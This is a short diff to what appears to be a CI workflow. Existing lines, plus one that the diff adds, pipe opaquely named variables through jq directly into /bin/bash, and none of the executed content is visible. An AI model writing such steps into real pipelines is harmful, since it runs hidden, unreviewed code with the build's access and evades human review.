@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$j5" | jq -r .hgbb01496 | /bin/bash
           printf '%s' "$vssb4510" | jq -r .ppiih804 | /bin/bash
           printf '%s' "$d46893" | jq -r .s376 | /bin/bash
+          echo $mqot83102 | jq -r .fpnr219 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
